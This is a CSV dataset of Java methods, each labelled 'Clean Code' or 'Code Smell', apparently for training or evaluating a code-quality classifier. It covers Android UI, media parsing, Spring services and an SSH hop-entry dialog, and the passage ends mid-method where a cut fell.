text,label,text_label
"@Override public void clearSearch(){
  mSearchQuery=null;
  for (  VideoGroupObjectAdapter adapter : mSearchGroupAdapters.values()) {
    adapter.clear();
  }
  mSearchGroupAdapters.clear();
  ObjectAdapter resultsAdapter=getResultsAdapter();
  if (resultsAdapter == null) {
    return;
  }
  int size=resultsAdapter.size();
  int index=0;
  for (int i=0; i < size; i++) {
    Object row=resultsAdapter.get(index);
    if (row instanceof ListRow && ((ListRow)row).getAdapter() instanceof VideoGroupObjectAdapter) {
      detachAdapter(index);
    }
 else {
      index++;
    }
  }
}",0,Clean Code
"private static void validateNoCyclesStep(Set<ClassQName> alreadySeen,MethodInfo method,boolean includeHolder){
  Set<ClassQName> outgoing=new HashSet<>();
  if (includeHolder) {
    outgoing.add(new ClassQName(method.getDeclaringClass()));
  }
  for (  ParameterInfo ppi : method.getParameters()) {
    outgoing.add(new ClassQName(ppi.getType()));
  }
  if (outgoing.isEmpty()) {
    return;
  }
  Set<ClassQName> currentSeen=new HashSet<>();
  currentSeen.addAll(alreadySeen);
  for (  ClassQName ci : outgoing) {
    if (!currentSeen.add(ci)) {
      throw new GenerationException(""@"" + State.class.getSimpleName() + "" dependency cycle is detected: ""+ ci.ci.getQualifiedName()+ "" ""+ currentSeen,method);
    }
    Set<ClassQName> nextSeen=new HashSet<>();
    nextSeen.addAll(alreadySeen);
    nextSeen.add(ci);
    for (    MethodInfo mi : BenchmarkGeneratorUtils.getAllMethods(ci.ci)) {
      if (mi.getAnnotation(Setup.class) != null || mi.getAnnotation(TearDown.class) != null) {
        validateNoCyclesStep(nextSeen,mi,false);
      }
    }
  }
}
",1,Code Smell
"@Override @RequestMapping(value=""login"",method=RequestMethod.POST) public ResponseResult login(String username,String password,String code) throws Exception {
  AuthToken authToken=authService.login(username,password,clientId,clientSecret);
  UserBasicInfo userBasicInfo=AuthenticationInterceptor.parseJwt(authToken.getJwt_token());
  CfUser cfUser=cfUserService.getUserByUid(userBasicInfo.getId(),true);
  cfUser.setPassword(null);
  CfCarParkLinkUserQuery cfCarParkLinkUserQuery=new CfCarParkLinkUserQuery();
  cfCarParkLinkUserQuery.setUid(userBasicInfo.getId());
  List<CfCarParkLinkUser> cfCarParkLinkUsers=cfCarParkLinkUserService.getListByQuery(cfCarParkLinkUserQuery);
  if (cfCarParkLinkUsers != null && cfCarParkLinkUsers.size() > 0) {
    for (    CfCarParkLinkUser cfCarParkLinkUser : cfCarParkLinkUsers) {
      if (StringUtils.isNotEmpty(cfCarParkLinkUser.getCheckPointIds())) {
        CfCarParkCheckpointQuery cfCarParkCheckpointQuery=new CfCarParkCheckpointQuery();
        String[] checkPointIds=cfCarParkLinkUser.getCheckPointIds().split("","");
        cfCarParkCheckpointQuery.setIds(new ArrayList<>());
        for (int i=0; i < checkPointIds.length; i++) {
          cfCarParkCheckpointQuery.getIds().add(checkPointIds[i]);
        }
        List<CfCarParkCheckpoint> cfCarParkCheckpoints=cfCarParkCheckpointService.getListByQuery(cfCarParkCheckpointQuery);
        if (cfCarParkCheckpoints != null && cfCarParkCheckpoints.size() > 0) {
          cfCarParkCheckpointQuery.setIds(new ArrayList<>());
          for (          CfCarParkCheckpoint cfCarParkCheckpoint : cfCarParkCheckpoints) {
            cfCarParkCheckpointQuery.getIds().add(cfCarParkCheckpoint.getId());
          }
          cfCarParkCheckpointQuery.setDutyUid(null);
          CfCarParkCheckpoint cfCarParkCheckpoint=new CfCarParkCheckpoint();
          cfCarParkCheckpoint.setDutyUid(userBasicInfo.getId());
          cfCarParkCheckpointService.updateByQuery(cfCarParkCheckpoint,cfCarParkCheckpointQuery);
        }
      }
    }
    if (System.currentTimeMillis() - cfCarParkLinkUsers.get(0).getStartDutyTime() > 39600000) {
      CfCarParkLinkUser cfCarParkLinkUser=new CfCarParkLinkUser();
      cfCarParkLinkUser.setStartDutyTime(System.currentTimeMillis());
      cfCarParkLinkUserService.updateByQuery(cfCarParkLinkUser,cfCarParkLinkUserQuery);
    }
  }
  return new ResponseResult(CommonCode.SUCCESS,cfUser,authToken,0);
}",1,Code Smell
"private static ItemData.@Nullable Builder createItemData(JsonNode itemNode,Map<String,GeyserMappingItem> items,BlockMappings blockMappings,Map<String,ItemDefinition> definitions){
  int count=1;
  int damage=0;
  NbtMap tag=null;
  String identifier=itemNode.get(""id"").textValue();
  for (  BiPredicate<String,Integer> predicate : JAVA_ONLY_ITEM_FILTER) {
    if (predicate.test(identifier,damage)) {
      return null;
    }
  }
  if (!items.containsKey(identifier) && !identifier.equals(""minecraft:lodestone_compass"")) {
    boolean found=false;
    for (    var mapping : items.values()) {
      if (mapping.getBedrockIdentifier().equals(identifier)) {
        found=true;
        break;
      }
    }
    if (!found) {
      return null;
    }
  }
  JsonNode damageNode=itemNode.get(""damage"");
  if (damageNode != null) {
    damage=damageNode.asInt();
  }
  JsonNode countNode=itemNode.get(""count"");
  if (countNode != null) {
    count=countNode.asInt();
  }
  GeyserBedrockBlock blockDefinition=null;
  JsonNode blockStateNode;
  if ((blockStateNode=itemNode.get(""block_state_b64"")) != null) {
    byte[] bytes=Base64.getDecoder().decode(blockStateNode.asText());
    ByteArrayInputStream bais=new ByteArrayInputStream(bytes);
    try {
      NbtMap stateTag=(NbtMap)NbtUtils.createReaderLE(bais).readTag();
      NbtMapBuilder builder=stateTag.toBuilder();
      builder.remove(""name_hash"");
      builder.remove(""network_id"");
      builder.remove(""version"");
      builder.remove(""block_id"");
      blockDefinition=blockMappings.getDefinition(builder.build());
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  JsonNode nbtNode=itemNode.get(""nbt_b64"");
  if (nbtNode != null) {
    byte[] bytes=Base64.getDecoder().decode(nbtNode.asText());
    ByteArrayInputStream bais=new ByteArrayInputStream(bytes);
    try {
      tag=(NbtMap)NbtUtils.createReaderLE(bais).readTag();
    }
 catch (    IOException e) {
      e.printStackTrace();
    }
  }
  ItemDefinition definition=definitions.get(identifier);
  if (definition == null) {
    GeyserImpl.getInstance().getLogger().debug(""Unknown item definition with identifier "" + identifier + "" when loading creative items!"");
    return null;
  }
  return ItemData.builder().definition(definition).damage(damage).count(count).tag(tag).blockDefinition(blockDefinition);
}",1,Code Smell
"public boolean takePicture(final File path,final CameraSession session,final Runnable callback){
  if (session == null) {
    return false;
  }
  final CameraInfo info=session.cameraInfo;
  final boolean flipFront=session.isFlipFront();
  Camera camera=info.camera;
  try {
    camera.takePicture(null,null,(data,camera1) -> {
      Bitmap bitmap=null;
      int size=(int)(AndroidUtilities.getPhotoSize() / AndroidUtilities.density);
      String key=String.format(Locale.US,""%s@%d_%d"",Utilities.MD5(path.getAbsolutePath()),size,size);
      try {
        BitmapFactory.Options options=new BitmapFactory.Options();
        options.inJustDecodeBounds=true;
        BitmapFactory.decodeByteArray(data,0,data.length,options);
        options.inJustDecodeBounds=false;
        options.inPurgeable=true;
        bitmap=BitmapFactory.decodeByteArray(data,0,data.length,options);
      }
 catch (      Throwable e) {
        FileLog.e(e);
      }
      try {
        if (info.frontCamera != 0 && flipFront) {
          try {
            Matrix matrix=new Matrix();
            matrix.setRotate(getOrientation(data));
            matrix.postScale(-1,1);
            Bitmap scaled=Bitmaps.createBitmap(bitmap,0,0,bitmap.getWidth(),bitmap.getHeight(),matrix,true);
            if (scaled != bitmap) {
              bitmap.recycle();
            }
            FileOutputStream outputStream=new FileOutputStream(path);
            scaled.compress(Bitmap.CompressFormat.JPEG,80,outputStream);
            outputStream.flush();
            outputStream.getFD().sync();
            outputStream.close();
            if (scaled != null) {
              ImageLoader.getInstance().putImageToCache(new BitmapDrawable(scaled),key,false);
            }
            if (callback != null) {
              callback.run();
            }
            return;
          }
 catch (          Throwable e) {
            FileLog.e(e);
          }
        }
        FileOutputStream outputStream=new FileOutputStream(path);
        outputStream.write(data);
        outputStream.flush();
        outputStream.getFD().sync();
        outputStream.close();
        if (bitmap != null) {
          ImageLoader.getInstance().putImageToCache(new BitmapDrawable(bitmap),key,false);
        }
      }
 catch (      Exception e) {
        FileLog.e(e);
      }
      if (callback != null) {
        callback.run();
      }
    }
);
    return true;
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  return false;
}",1,Code Smell
"private void processCurrentPacket(){
  if (currentDtvCcPacket.currentIndex != (currentDtvCcPacket.packetSize * 2 - 1)) {
    Log.w(TAG,""DtvCcPacket ended prematurely; size is "" + (currentDtvCcPacket.packetSize * 2 - 1) + "", but current index is ""+ currentDtvCcPacket.currentIndex+ "" (sequence number ""+ currentDtvCcPacket.sequenceNumber+ ""); ignoring packet"");
    return;
  }
  serviceBlockPacket.reset(currentDtvCcPacket.packetData,currentDtvCcPacket.currentIndex);
  int serviceNumber=serviceBlockPacket.readBits(3);
  int blockSize=serviceBlockPacket.readBits(5);
  if (serviceNumber == 7) {
    serviceBlockPacket.skipBits(2);
    serviceNumber=serviceBlockPacket.readBits(6);
    if (serviceNumber < 7) {
      Log.w(TAG,""Invalid extended service number: "" + serviceNumber);
    }
  }
  if (blockSize == 0) {
    if (serviceNumber != 0) {
      Log.w(TAG,""serviceNumber is non-zero ("" + serviceNumber + "") when blockSize is 0"");
    }
    return;
  }
  if (serviceNumber != selectedServiceNumber) {
    return;
  }
  boolean cuesNeedUpdate=false;
  while (serviceBlockPacket.bitsLeft() > 0) {
    int command=serviceBlockPacket.readBits(8);
    if (command != COMMAND_EXT1) {
      if (command <= GROUP_C0_END) {
        handleC0Command(command);
      }
 else       if (command <= GROUP_G0_END) {
        handleG0Character(command);
        cuesNeedUpdate=true;
      }
 else       if (command <= GROUP_C1_END) {
        handleC1Command(command);
        cuesNeedUpdate=true;
      }
 else       if (command <= GROUP_G1_END) {
        handleG1Character(command);
        cuesNeedUpdate=true;
      }
 else {
        Log.w(TAG,""Invalid base command: "" + command);
      }
    }
 else {
      command=serviceBlockPacket.readBits(8);
      if (command <= GROUP_C2_END) {
        handleC2Command(command);
      }
 else       if (command <= GROUP_G2_END) {
        handleG2Character(command);
        cuesNeedUpdate=true;
      }
 else       if (command <= GROUP_C3_END) {
        handleC3Command(command);
      }
 else       if (command <= GROUP_G3_END) {
        handleG3Character(command);
        cuesNeedUpdate=true;
      }
 else {
        Log.w(TAG,""Invalid extended command: "" + command);
      }
    }
  }
  if (cuesNeedUpdate) {
    cues=getDisplayCues();
  }
}",0,Clean Code
"@Test public void testEvaluateQueueSizeRetainMoreThanMinimumDurationAfterDiscard(){
  Format format1=videoFormat(500,320,240);
  Format format2=videoFormat(1000,640,480);
  Format format3=videoFormat(2000,960,720);
  TrackGroup trackGroup=new TrackGroup(format1,format2,format3);
  FakeMediaChunk chunk1=new FakeMediaChunk(format1,0,10_000_000);
  FakeMediaChunk chunk2=new FakeMediaChunk(format1,10_000_000,20_000_000);
  FakeMediaChunk chunk3=new FakeMediaChunk(format1,20_000_000,30_000_000);
  List<FakeMediaChunk> queue=new ArrayList<>();
  queue.add(chunk1);
  queue.add(chunk2);
  queue.add(chunk3);
  when(mockBandwidthMeter.getBitrateEstimate()).thenReturn(500L);
  adaptiveTrackSelection=adaptiveTrackSelectionWithMinTimeBetweenBufferReevaluationMs(trackGroup,15_000,2000);
  int initialQueueSize=adaptiveTrackSelection.evaluateQueueSize(0,queue);
  assertThat(initialQueueSize).isEqualTo(3);
  fakeClock.advanceTime(2000);
  when(mockBandwidthMeter.getBitrateEstimate()).thenReturn(1000L);
  int newSize=adaptiveTrackSelection.evaluateQueueSize(0,queue);
  assertThat(newSize).isEqualTo(2);
}",0,Clean Code
"/** 
 * update subclass field values
 * @return if changed
 */
public boolean updModifyInfo(long dataVerId,int topicNameId,int brokerPort,String brokerIp,TopicStatus deployStatus,TopicPropGroup topicProps){
  boolean changed=false;
  if (dataVerId != TBaseConstants.META_VALUE_UNDEFINED && this.getDataVerId() != dataVerId) {
    changed=true;
    this.setDataVersionId(dataVerId);
  }
  if (topicNameId != TBaseConstants.META_VALUE_UNDEFINED && this.topicNameId != topicNameId) {
    changed=true;
    this.topicNameId=topicNameId;
  }
  if (brokerPort != TBaseConstants.META_VALUE_UNDEFINED && this.brokerPort != brokerPort) {
    changed=true;
    this.brokerPort=brokerPort;
  }
  if (TStringUtils.isNotBlank(brokerIp) && !this.brokerIp.equals(brokerIp)) {
    changed=true;
    this.brokerIp=brokerIp;
  }
  if (deployStatus != null && deployStatus != TopicStatus.STATUS_TOPIC_UNDEFINED && this.deployStatus != deployStatus) {
    changed=true;
    this.deployStatus=deployStatus;
  }
  if (topicProps != null && !topicProps.isDataEquals(this.topicProps)) {
    if (this.topicProps.updModifyInfo(topicProps)) {
      changed=true;
    }
  }
  if (changed) {
    this.brokerAddress=KeyBuilderUtils.buildAddressInfo(this.brokerIp,this.brokerPort);
    updSerialId();
  }
  return changed;
}
",0,Clean Code
"private void openAddMember(){
  Bundle args=new Bundle();
  args.putBoolean(""addToGroup"",true);
  args.putLong(""chatId"",currentChat.id);
  GroupCreateActivity fragment=new GroupCreateActivity(args);
  fragment.setInfo(chatInfo);
  if (chatInfo != null && chatInfo.participants != null) {
    LongSparseArray<TLObject> users=new LongSparseArray<>();
    for (int a=0; a < chatInfo.participants.participants.size(); a++) {
      users.put(chatInfo.participants.participants.get(a).user_id,null);
    }
    fragment.setIgnoreUsers(users);
  }
  fragment.setDelegate((users,fwdCount) -> {
    HashSet<Long> currentParticipants=new HashSet<>();
    ArrayList<TLRPC.User> addedUsers=new ArrayList<>();
    if (chatInfo.participants.participants != null) {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        currentParticipants.add(chatInfo.participants.participants.get(i).user_id);
      }
    }
    getMessagesController().addUsersToChat(currentChat,ProfileActivity.this,users,fwdCount,user -> {
      addedUsers.add(user);
    }
,restrictedUser -> {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        if (chatInfo.participants.participants.get(i).user_id == restrictedUser.id) {
          chatInfo.participants.participants.remove(i);
          updateListAnimated(true);
          break;
        }
      }
    }
,() -> {
      int N=addedUsers.size();
      int[] finished=new int[1];
      for (int a=0; a < N; a++) {
        TLRPC.User user=addedUsers.get(a);
        if (!currentParticipants.contains(user.id)) {
          if (chatInfo.participants == null) {
            chatInfo.participants=new TLRPC.TL_chatParticipants();
          }
          if (ChatObject.isChannel(currentChat)) {
            TLRPC.TL_chatChannelParticipant channelParticipant1=new TLRPC.TL_chatChannelParticipant();
            channelParticipant1.channelParticipant=new TLRPC.TL_channelParticipant();
            channelParticipant1.channelParticipant.inviter_id=getUserConfig().getClientUserId();
            channelParticipant1.channelParticipant.peer=new TLRPC.TL_peerUser();
            channelParticipant1.channelParticipant.peer.user_id=user.id;
            channelParticipant1.channelParticipant.date=getConnectionsManager().getCurrentTime();
            channelParticipant1.user_id=user.id;
            chatInfo.participants.participants.add(channelParticipant1);
          }
 else {
            TLRPC.ChatParticipant participant=new TLRPC.TL_chatParticipant();
            participant.user_id=user.id;
            participant.inviter_id=getAccountInstance().getUserConfig().clientUserId;
            chatInfo.participants.participants.add(participant);
          }
          chatInfo.participants_count++;
          getMessagesController().putUser(user,false);
        }
      }
      updateListAnimated(true);
    }
);
  }
);
  presentFragment(fragment);
}",1,Code Smell
"/** 
 * Generate shard array
 * @param sheetInfoList A list sheet metadata.
 * @param batchSize Size of a split.
 * @param skipNums Number of rows to skip.
 * @return An array of splits.
 */
private static InputSplit[] calculateLarkSheetInputSplits(List<SheetInfo> sheetInfoList,int batchSize,List<Integer> skipNums){
  int splitCount=0;
  if (skipNums.isEmpty()) {
    splitCount=sheetInfoList.stream().mapToInt(sheetInfo -> (int)Math.ceil((double)(sheetInfo.getSheetMeta().getRowCount() - 1) / (double)batchSize)).sum();
  }
 else {
    for (int i=0; i < sheetInfoList.size(); i++) {
      SheetInfo sheetInfo=sheetInfoList.get(i);
      int skipNum=0;
      if (skipNums.size() > i) {
        skipNum=Math.max(skipNums.get(i),0);
      }
      splitCount+=(int)Math.ceil((double)Math.max(sheetInfo.getSheetMeta().getRowCount() - 1 - skipNum,0) / (double)batchSize);
    }
  }
  InputSplit[] larkSheetInputSplits=new LarkSheetInputSplit[splitCount];
  splitCount=0;
  for (int i=0; i < sheetInfoList.size(); i++) {
    SheetInfo sheetInfo=sheetInfoList.get(i);
    SheetMeta sheetMeta=sheetInfo.getSheetMeta();
    String sheetToken=sheetInfo.getSheetToken();
    int curCount=0;
    int skipNum=0;
    if (skipNums.isEmpty()) {
      curCount=(int)Math.ceil((double)(sheetMeta.getRowCount() - 1) / (double)batchSize);
    }
 else {
      if (skipNums.size() > i) {
        skipNum=Math.max(skipNums.get(i),0);
      }
      curCount=(int)Math.ceil((double)Math.max(sheetInfo.getSheetMeta().getRowCount() - 1 - skipNum,0) / (double)batchSize);
    }
    for (int j=0; j < curCount; j++) {
      int startRowNumber=2 + j * batchSize + skipNum;
      int endRowNumber=startRowNumber + batchSize - 1;
      larkSheetInputSplits[splitCount]=new LarkSheetInputSplit(sheetMeta,sheetToken,sheetMeta.getSheetId(),startRowNumber,endRowNumber);
      splitCount+=1;
    }
  }
  return larkSheetInputSplits;
}",1,Code Smell
"@Test public void testFilterUpdate(){
  adapter.mFilter.status=ConnectionDescriptor.Status.STATUS_ACTIVE;
  adapter.refreshFilteredConnections();
  reg.newConnections(new ConnectionDescriptor[]{newConnection(false),newConnection(true),newConnection(true),newConnection(true),newConnection(true),newConnection(true),newConnection(true),newConnection(false)});
  reg.newConnections(new ConnectionDescriptor[]{newConnection(true),newConnection(false),newConnection(false),newConnection(true)});
  assertEquals(5,adapter.getItemCount());
  assertEquals(4,adapter.getItem(0).incr_id);
  assertEquals(11,adapter.getItem(4).incr_id);
  pendingEvents.clear();
  reg.connectionsUpdates(new ConnectionUpdate[]{connUpdate(0,UpdateType.UPDATE_STATS),connUpdate(5,UpdateType.UPDATE_STATS),connUpdate(7,UpdateType.UPDATE_STATS),connUpdate(11,UpdateType.UPDATE_STATS)});
  ArraySet<Integer> updated=getNotifiedPositions(ChangeType.ITEMS_UPDATED);
  assertEquals(2,updated.size());
  assertTrue(updated.contains(1));
  assertTrue(updated.contains(4));
  assertEquals(adapter.getItem(1).sent_pkts,1);
  assertEquals(adapter.getItem(4).sent_pkts,1);
  assertEquals(adapter.getItem(2).sent_pkts,0);
}",0,Clean Code
"public void setHorizontalPadding(float padding,float progress,boolean allowShare){
  float leftPadding=-padding * (1f - progress);
  float rightPadding=-(padding + dp(40)) * (1f - progress);
  float s=0.5f + 0.5f * progress;
  emojiButtonPaddingScale=s;
  emojiButtonPaddingAlpha=progress;
  updateEmojiButtonParams();
  emojiButton.setTranslationX(-leftPadding);
  messageTextPaddingTranslationX=-leftPadding - dp(31) * (1f - progress);
  if (recordDeleteImageView != null) {
    recordDeleteImageView.setTranslationX(-leftPadding);
  }
  if (recordCircle != null) {
    recordCircle.setTranslationX(rightPadding);
  }
  if (controlsView != null) {
    controlsView.setTranslationX(rightPadding);
  }
  if (recordTimeContainer != null) {
    recordTimeContainer.setTranslationX(-leftPadding);
  }
  if (recordedAudioPlayButton != null) {
    recordedAudioPlayButton.setTranslationX(-leftPadding);
  }
  if (recordedAudioTimeTextView != null) {
    recordedAudioTimeTextView.setTranslationX(leftPadding);
  }
  sendButtonContainer.setTranslationX(rightPadding);
  sendButtonContainer.setAlpha(allowShare ? progress : 1f);
  sendButtonEnabled=allowShare ? progress == 1f : true;
  attachLayoutPaddingTranslationX=rightPadding;
  attachLayoutPaddingAlpha=progress;
  updateAttachLayoutParams();
  updateMessageTextParams();
  float newPadding=padding * (1f - progress);
  if (horizontalPadding != newPadding) {
    horizontalPadding=newPadding;
    if (seekBarWaveform != null && recordedAudioSeekBar != null) {
      recordedAudioSeekBar.setTranslationX(horizontalPadding);
      recordedAudioSeekBar.invalidate();
      seekBarWaveform.setSize((int)(recordedAudioSeekBar.getMeasuredWidth() - horizontalPadding * 2),recordedAudioSeekBar.getMeasuredHeight());
    }
    if (recordedAudioBackground != null) {
      recordedAudioBackground.invalidate();
    }
  }
  if (messageEditText != null) {
    float scale=lerp(0.88f,1f,progress);
    messageEditText.setPivotX(0);
    messageEditText.setPivotY(messageEditText.getMeasuredHeight() / 2f);
    messageEditText.setScaleX(scale);
    messageEditText.setScaleY(scale);
    messageEditText.setHintRightOffset(lerp(dp(30),0,progress));
  }
}",0,Clean Code
"private HopEntry addOrEditEntry(HopEntry e){
  JTextField txtHost=new SkinnedTextField(30);
  JSpinner spPort=new JSpinner(new SpinnerNumberModel(22,1,SessionInfoPanel.DEFAULT_MAX_PORT,1));
  JTextField txtUser=new SkinnedTextField(30);
  JPasswordField txtPassword=new JPasswordField(30);
  Box b1=Box.createHorizontalBox();
  JTextField txtKeyFile=new SkinnedTextField(30);
  JButton btnBrowse=new JButton(""..."");
  b1.add(txtKeyFile);
  b1.add(Box.createHorizontalStrut(10));
  b1.add(btnBrowse);
  if (e != null) {
    if (e.getHost() != null)     txtHost.setText(e.getHost());
    if (e.getUser() != null)     txtUser.setText(e.getUser());
    if (e.getKeypath() != null)     txtKeyFile.setText(e.getKeypath());
    spPort.setValue((Integer)e.getPort());
  }
  btnBrowse.addActionListener(ev -> {
    JFileChooser jfc=new JFileChooser();
    jfc.setFileHidingEnabled(false);
    if (jfc.showOpenDialog(null) == JFileChooser.APPROVE_OPTION) {
      File f=jfc.getSelectedFile();
      txtKeyFile.setText(f.getAbsolutePath());
    }
  }
);
  while (JOptionPane.showOptionDialog(this,new Object[]{""Host"",txtHost,""Port"",spPort,""User"",txtUser,""Password"",txtPassword,""Private key"",txtKeyFile},""Hop entry"",JOptionPane.OK_CANCEL_OPTION,JOptionPane.PLAIN_MESSAGE,null,null,null) == JOptionPane.OK_OPTION) {
    String host=txtHost.getText();
    String user=txtUser.getText();
    String password=txtPassword.getPassword().length > 0 ? new String(txtPassword.getPassword()) : null;
    String path=txtKeyFile.getText();
    int port=(Integer)spPort.getValue();
    if (host.length() < 1 || user.length() < 1 || port <= 0) {
      JOptionPane.showMessageDialog(this,""Invalid input: all fields mandatory"");
      continue;
    }
    if (e == null) {
      e=new HopEntry();
      e.setId(UUID.randomUUID().toString());
    }
    e.setHost(host);
    e.setPassword(password);
    e.setUser(user);
    e.setPort(port);
    e.setKeypath(path);
    return e;
  }
  return null;
}",0,Clean Code
"@Override public QuitLineupCsReq mergeFrom(final QuitLineupCsReq other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasPlaneId()) {
    setPlaneId(other.planeId);
  }
  if (other.hasBaseAvatarId()) {
    setBaseAvatarId(other.baseAvatarId);
  }
  if (other.hasIndex()) {
    setIndex(other.index);
  }
  if (other.hasExtraLineupType()) {
    setExtraLineupTypeValue(other.extraLineupType);
  }
  if (other.hasAvatarType()) {
    setAvatarTypeValue(other.avatarType);
  }
  if (other.hasIsVirtual()) {
    setIsVirtual(other.isVirtual);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@43a7e53b!org.eclipse.jdt.core.dom.MethodDeclaration@30ff1a86",0,Clean Code
"public void generateOtherInfo(){
  isStopped=(flags & ApplicationInfo.FLAG_STOPPED) != 0;
  isPersistent=(flags & ApplicationInfo.FLAG_PERSISTENT) != 0;
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
    usesCleartextTraffic=(flags & ApplicationInfo.FLAG_USES_CLEARTEXT_TRAFFIC) != 0;
  }
  for (  int userId : userIds) {
    canReadLogs|=(PermissionCompat.checkPermission(Manifest.permission.READ_LOGS,packageName,userId) == PackageManager.PERMISSION_GRANTED);
    isAppInactive|=UsageStatsManagerCompat.isAppInactive(packageName,userId);
  }
  allowClearingUserData=(flags & ApplicationInfo.FLAG_ALLOW_CLEAR_USER_DATA) != 0;
  if (userIds.length > 1) {
    int appId=UserHandleHidden.getAppId(uid);
    uidOrAppIds=userIds.length + ""+"" + appId;
  }
 else   if (userIds.length == 1) {
    uidOrAppIds=String.valueOf(uid);
  }
 else   uidOrAppIds="""";
  if (sha != null) {
    try {
      issuerShortName=""CN="" + (sha.first).split(""CN="",2)[1];
    }
 catch (    ArrayIndexOutOfBoundsException e) {
      issuerShortName=sha.first;
    }
    if (TextUtils.isEmpty(sha.second)) {
      sha=null;
    }
  }
  versionTag=versionName;
  if (isInstalled && (flags & ApplicationInfo.FLAG_HARDWARE_ACCELERATED) == 0)   versionTag=""_"" + versionTag;
  if ((flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0)   versionTag=""debug"" + versionTag;
  if ((flags & ApplicationInfo.FLAG_TEST_ONLY) != 0)   versionTag=""~"" + versionTag;
  appTypePostfix="""";
  if ((flags & ApplicationInfo.FLAG_LARGE_HEAP) != 0)   appTypePostfix+=""#"";
  if ((flags & ApplicationInfo.FLAG_SUSPENDED) != 0)   appTypePostfix+=""掳"";
  if ((flags & ApplicationInfo.FLAG_MULTIARCH) != 0)   appTypePostfix+=""X"";
  if ((flags & ApplicationInfo.FLAG_HAS_CODE) == 0)   appTypePostfix+=""0"";
  if ((flags & ApplicationInfo.FLAG_VM_SAFE_MODE) != 0)   appTypePostfix+=""?"";
  if (sdk != null && sdk > 0) {
    sdkString=""SDK "" + sdk;
  }
  diffInstallUpdateInDays=TimeUnit.DAYS.convert(lastUpdateTime - firstInstallTime,TimeUnit.MILLISECONDS);
  if (backup != null) {
    lastBackupDays=TimeUnit.DAYS.convert(System.currentTimeMillis() - backup.backupTime,TimeUnit.MILLISECONDS);
    backupFlagsStr=new StringBuilder();
    if (backup.getFlags().backupApkFiles())     backupFlagsStr.append(""apk"");
    if (backup.getFlags().backupData()) {
      if (backupFlagsStr.length() > 0)       backupFlagsStr.append(""+"");
      backupFlagsStr.append(""data"");
    }
    if (backup.hasRules) {
      if (backupFlagsStr.length() > 0)       backupFlagsStr.append(""+"");
      backupFlagsStr.append(""rules"");
    }
  }
}",1,Code Smell
"@Override public CfAdExample getExampleByQuery(CfAdQuery cfAdQuery){
  CfAdExample cfAdExample=new CfAdExample();
  CfAdExample.Criteria criteria=cfAdExample.createCriteria();
  if (cfAdQuery.getId() != null) {
    criteria.andIdEqualTo(cfAdQuery.getId());
  }
  if (cfAdQuery.getMaterialType() != null) {
    criteria.andMaterialTypeEqualTo(cfAdQuery.getMaterialType());
  }
  if (cfAdQuery.getMinStartTime() != null) {
    criteria.andStartTimeGreaterThanOrEqualTo(cfAdQuery.getMinStartTime());
  }
  if (cfAdQuery.getMaxStartTime() != null) {
    criteria.andStartTimeLessThanOrEqualTo(cfAdQuery.getMaxStartTime());
  }
  if (cfAdQuery.getMinEndTime() != null) {
    criteria.andEndTimeGreaterThanOrEqualTo(cfAdQuery.getMinEndTime());
  }
  if (cfAdQuery.getMaxEndTime() != null) {
    criteria.andEndTimeLessThanOrEqualTo(cfAdQuery.getMaxEndTime());
  }
  if (StringUtils.isNotEmpty(cfAdQuery.getOrderBy())) {
    cfAdExample.setOrderByClause(cfAdQuery.getOrderBy());
  }
  if (cfAdQuery.getPage() != null && cfAdQuery.getSize() != null) {
    PageHelper.startPage(cfAdQuery.getPage(),cfAdQuery.getSize());
  }
  return cfAdExample;
}
",0,Clean Code
"@Override public void run(){
  String address=AddressUtils.getRealAddressByIP(ip);
  StringBuilder s=new StringBuilder();
  s.append(LogUtils.getBlock(ip));
  s.append(address);
  s.append(LogUtils.getBlock(userName));
  s.append(LogUtils.getBlock(userId));
  s.append(LogUtils.getBlock(status));
  s.append(LogUtils.getBlock(message));
  sys_user_logger.info(s.toString(),args);
  String os=userAgent.getOperatingSystem().getName();
  String browser=userAgent.getBrowser().getName();
  SysLoginLogEntity logininfor=new SysLoginLogEntity();
  logininfor.setLoginTime(new Date());
  logininfor.setUserName(userName);
  logininfor.setUserId(userId);
  logininfor.setIpaddr(ip);
  logininfor.setLoginLocation(address);
  logininfor.setBrowser(browser);
  logininfor.setOs(os);
  logininfor.setMsg(message);
  if (StringUtils.equalsAny(status,Constants.LOGIN_SUCCESS,Constants.LOGOUT,Constants.REGISTER)) {
    logininfor.setStatus(Constants.SUCCESS);
  }
 else   if (Constants.LOGIN_FAIL.equals(status)) {
    logininfor.setStatus(Constants.FAIL);
  }
  SpringUtils.getBean(SysLoginLogService.class).insertLogininfor(logininfor);
}
@Override public void run(){
  SpringUtils.getBean(SysOperLogService.class).insertOperlog(operLog);
}
",0,Clean Code
"public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children){
  setupWithBottomNavigationView(bottomNavigationView,groupScene,containerId,children,null);
}
public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children,@Nullable final BottomNavigationView.OnNavigationItemSelectedListener onNavigationItemSelectedListener){
  if (children.size() == 0) {
    throw new IllegalArgumentException(""children can't be empty"");
  }
  final List<String> menuIdList=new ArrayList<>();
  int menuSize=bottomNavigationView.getMenu().size();
  for (int i=0; i < menuSize; i++) {
    menuIdList.add(String.valueOf(bottomNavigationView.getMenu().getItem(i).getItemId()));
  }
  bottomNavigationView.setOnNavigationItemSelectedListener(new BottomNavigationView.OnNavigationItemSelectedListener(){
    @Override public boolean onNavigationItemSelected(    @NonNull MenuItem item){
      if (onNavigationItemSelectedListener != null) {
        onNavigationItemSelectedListener.onNavigationItemSelected(item);
      }
      item.setChecked(true);
      String tag=String.valueOf(item.getItemId());
      Scene scene=groupScene.findSceneByTag(tag);
      if (scene == null) {
        scene=children.get(item.getItemId());
      }
      if (!groupScene.isAdded(scene)) {
        groupScene.add(containerId,scene,tag);
      }
 else       if (!groupScene.isShowing(scene)) {
        groupScene.show(scene);
      }
      for (int i=0; i < menuIdList.size(); i++) {
